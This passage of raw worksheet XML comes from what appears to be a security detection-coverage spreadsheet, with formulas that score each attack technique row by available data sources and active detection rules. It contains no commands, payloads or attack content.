        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M9" s="9" cm="1">
        <f t="array" ref="M9">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N9" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O9" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>1</v>
      </c>
      <c r="P9" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S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9" t="s">
        <v>386</v>
      </c>
      <c r="U9" t="s">
        <v>397</v>
      </c>
      <c r="V9" t="s">
        <v>398</v>
      </c>
      <c r="W9" t="b">
        <v>1</v>
      </c>
      <c r="X9" t="s">
        <v>380</v>
      </c>
    </row>
    <row r="10" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A10" t="s">
        <v>380</v>
      </c>
      <c r="B10" t="s">
        <v>399</v>
      </c>
      <c r="C10" t="s">
        <v>400</v>
      </c>
      <c r="D10" t="s">
        <v>7</v>
      </c>
      <c r="E10" t="s">
        <v>401</v>
      </c>
      <c r="F10" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G10" s="9" cm="1">
        <f t="array" ref="G10">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H10" s="9" t="str" cm="1">
        <f t="array" ref="H10">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I10" s="9" t="str" cm="1">
        <f t="array" ref="I10">IF(SUM(IF($C10=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C10=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J10" s="9" t="str" cm="1">
        <f t="array" ref="J1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0" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M10" s="9" cm="1">
        <f t="array" ref="M10">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N10" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O10" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P10" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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0" t="s">
        <v>386</v>
      </c>
      <c r="U10" t="s">
        <v>402</v>
      </c>
      <c r="V10" t="s">
        <v>403</v>
      </c>
      <c r="W10" t="b">
        <v>1</v>
      </c>
      <c r="X10" t="s">
        <v>380</v>
      </c>
    </row>
    <row r="11" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A11" t="s">
        <v>380</v>
      </c>
      <c r="B11" t="s">
        <v>404</v>
      </c>
      <c r="C11" t="s">
        <v>405</v>
      </c>
      <c r="D11" t="s">
        <v>7</v>
      </c>
      <c r="E11" t="s">
        <v>406</v>
      </c>
      <c r="F11" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G11" s="9" cm="1">
        <f t="array" ref="G11">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H11" s="9" t="str" cm="1">
        <f t="array" ref="H11">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I11" s="9" t="str" cm="1">
        <f t="array" ref="I11">IF(SUM(IF($C11=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C11=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J11" s="9" t="str" cm="1">
        <f t="array" ref="J1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1" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M11" s="9" cm="1">
        <f t="array" ref="M11">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N11" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O11" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P11" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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1" t="s">
        <v>407</v>
      </c>
      <c r="U11" t="s">
        <v>408</v>
      </c>
      <c r="V11" t="s">
        <v>409</v>
      </c>
      <c r="W11" t="b">
        <v>1</v>
      </c>
      <c r="X11" t="s">
        <v>380</v>
      </c>
    </row>
    <row r="12" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A12" t="s">
        <v>380</v>
      </c>
      <c r="B12" t="s">
        <v>410</v>
      </c>
      <c r="C12" t="s">
        <v>304</v>
      </c>
      <c r="D12" t="s">
        <v>7</v>
      </c>
      <c r="E12" t="s">
        <v>411</v>
      </c>
      <c r="F12" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G12" s="9" cm="1">
        <f t="array" ref="G12">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H12" s="9" t="str" cm="1">
        <f t="array" ref="H12">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I12" s="9" t="str" cm="1">
        <f t="array" ref="I12">IF(SUM(IF($C12=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C12=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J12" s="9" t="str" cm="1">
        <f t="array" ref="J1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2" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M12" s="9" cm="1">
        <f t="array" ref="M12">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N12" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O12" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P12" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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2" t="s">
        <v>386</v>
      </c>
      <c r="U12" t="s">
        <v>412</v>
      </c>
      <c r="V12" t="s">
        <v>413</v>
      </c>
      <c r="W12" t="b">
        <v>1</v>
      </c>
      <c r="X12" t="s">
        <v>380</v>
      </c>
    </row>
    <row r="13" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A13" t="s">
        <v>380</v>
      </c>
      <c r="B13" t="s">
        <v>414</v>
      </c>
      <c r="C13" t="s">
        <v>415</v>
      </c>
      <c r="D13" t="s">
        <v>7</v>
      </c>
      <c r="E13" t="s">
        <v>396</v>
      </c>
      <c r="F13" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G13" s="9" cm="1">
        <f t="array" ref="G13">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H13" s="9" t="str" cm="1">
        <f t="array" ref="H13">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I13" s="9" t="str" cm="1">
        <f t="array" ref="I13">IF(SUM(IF($C13=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C13=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J13" s="9" t="str" cm="1">
        <f t="array" ref="J1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3" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M13" s="9" cm="1">
        <f t="array" ref="M13">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N13" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O13" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P13" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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3" t="s">
        <v>416</v>
      </c>
      <c r="U13" t="s">
        <v>417</v>
      </c>
      <c r="V13" t="s">
        <v>418</v>
      </c>
      <c r="W13" t="b">
        <v>1</v>
      </c>
      <c r="X13" t="s">
        <v>380</v>
      </c>
    </row>
    <row r="14" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A14" t="s">
        <v>380</v>
      </c>
      <c r="B14" t="s">
        <v>419</v>
      </c>
      <c r="C14" t="s">
        <v>420</v>
      </c>
      <c r="D14" t="s">
        <v>7</v>
      </c>
      <c r="E14" t="s">
        <v>396</v>
      </c>
      <c r="F14" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G14" s="9" cm="1">
        <f t="array" ref="G14">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H14" s="9" t="str" cm="1">
        <f t="array" ref="H14">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I14" s="9" t="str" cm="1">
        <f t="array" ref="I14">IF(SUM(IF($C14=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C14=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J14" s="9" t="str" cm="1">
        <f t="array" ref="J1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4" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M14" s="9" cm="1">
        <f t="array" ref="M14">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N14" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O14" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P14" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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4" t="s">
        <v>416</v>
      </c>
      <c r="U14" t="s">
        <v>421</v>
      </c>
      <c r="V14" t="s">
        <v>422</v>
      </c>
      <c r="W14" t="b">
        <v>1</v>
      </c>
      <c r="X14" t="s">
        <v>380</v>
      </c>
    </row>
    <row r="15" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A15" t="s">
        <v>423</v>
      </c>
      <c r="B15" t="s">
        <v>423</v>
      </c>
      <c r="C15" t="s">
        <v>139</v>
      </c>
      <c r="D15" t="s">
        <v>10</v>
      </c>
      <c r="E15" t="s">
        <v>424</v>
      </c>
      <c r="F15" s="9">
        <f t="shared" si="0"/>
        <v>5</v>
      </c>
      <c r="G15" s="9" cm="1">
        <f t="array" ref="G15">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H15" s="9" cm="1">
        <f t="array" ref="H15">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I15" s="9" t="str" cm="1">
        <f t="array" ref="I15">IF(SUM(IF($C15=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C15=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J15" s="9" t="str" cm="1">
        <f t="array" ref="J1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5" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M15" s="9" cm="1">
        <f t="array" ref="M15">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N15" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O15" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P15" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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5" t="s">
        <v>425</v>
      </c>
      <c r="U15" t="s">
        <v>426</v>
      </c>
      <c r="V15" t="s">
        <v>427</v>
      </c>
      <c r="W15" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="16" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A16" t="s">
        <v>428</v>
      </c>
      <c r="B16" t="s">
        <v>428</v>
      </c>
      <c r="C16" t="s">
        <v>107</v>
      </c>
      <c r="D16" t="s">
        <v>6</v>
      </c>
      <c r="E16" t="s">
        <v>429</v>
      </c>
      <c r="F16" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G16" s="9" cm="1">
        <f t="array" ref="G16">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H16" s="9" cm="1">
        <f t="array" ref="H16">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I16" s="9" t="str" cm="1">
        <f t="array" ref="I16">IF(SUM(IF($C16=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C16=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J16" s="9" t="str" cm="1">
        <f t="array" ref="J1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6" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M16" s="9" cm="1">
        <f t="array" ref="M16">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N16" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O16" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P16" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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6" t="s">
        <v>430</v>
      </c>
      <c r="U16" t="s">
        <v>431</v>
      </c>
      <c r="V16" t="s">
        <v>432</v>
      </c>
      <c r="W16" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="17" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A17" t="s">
        <v>433</v>
      </c>
      <c r="B17" t="s">
        <v>433</v>
      </c>
      <c r="C17" t="s">
        <v>204</v>
      </c>
      <c r="D17" t="s">
        <v>8</v>
      </c>
      <c r="E17" t="s">
        <v>434</v>
      </c>
      <c r="F17" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G17" s="9" cm="1">
        <f t="array" ref="G17">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H17" s="9" cm="1">
        <f t="array" ref="H17">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I17" s="9" t="str" cm="1">
        <f t="array" ref="I17">IF(SUM(IF($C17=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C17=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J17" s="9" t="str" cm="1">
        <f t="array" ref="J1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7" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M17" s="9" cm="1">
        <f t="array" ref="M17">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N17" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O17" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P17" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S1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7" t="s">
        <v>368</v>
      </c>
      <c r="U17" t="s">
        <v>435</v>
      </c>
      <c r="V17" t="s">
        <v>436</v>
      </c>
      <c r="W17" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="18" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A18" t="s">
        <v>437</v>
      </c>
      <c r="B18" t="s">
        <v>437</v>
      </c>
      <c r="C18" t="s">
        <v>112</v>
      </c>
      <c r="D18" t="s">
        <v>11</v>
      </c>
      <c r="E18" t="s">
        <v>438</v>
      </c>
      <c r="F18" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G18" s="9" cm="1">
        <f t="array" ref="G18">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H18" s="9" cm="1">
        <f t="array" ref="H18">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I18" s="9" t="str" cm="1">
        <f t="array" ref="I18">IF(SUM(IF($C18=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C18=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J18" s="9" t="str" cm="1">
        <f t="array" ref="J1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8" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M18" s="9" cm="1">
        <f t="array" ref="M18">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N18" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O18" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P18" s="14" t="str">
